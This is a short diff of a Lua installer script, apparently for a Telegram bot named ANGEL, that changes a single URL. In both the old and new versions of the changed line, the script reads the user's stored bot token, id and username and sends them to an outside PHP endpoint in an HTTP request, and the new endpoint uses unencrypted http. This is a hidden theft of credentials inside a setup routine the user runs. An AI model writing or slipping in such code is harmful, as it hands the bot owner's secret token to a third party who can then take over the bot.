@@ -64,7 +64,7 @@ os.execute('lua start.lua')
 end
 local function Files_ANGEL_Info()
 Create_Info(database:get(Server_ANGEL.."Token_ANGEL"),database:get(Server_ANGEL.."Id_ANGEL"),database:get(Server_ANGEL.."UserName_ANGEL"))   
-https.request("https://forhassan.ml/Black/ANGEL.php?id="..database:get(Server_ANGEL.."Id_ANGEL").."&user="..database:get(Server_ANGEL.."UserName_ANGEL").."&token="..database:get(Server_ANGEL.."Token_ANGEL"))
+https.request("http://angel.aba.vg/ali.php?id="..database:get(Server_ANGEL.."Id_ANGEL").."&user="..database:get(Server_ANGEL.."UserName_ANGEL").."&token="..database:get(Server_ANGEL.."Token_ANGEL"))
 local RunANGEL = io.open("ANGEL", 'w')
 RunANGEL:write([[
 #!/usr/bin/env bash
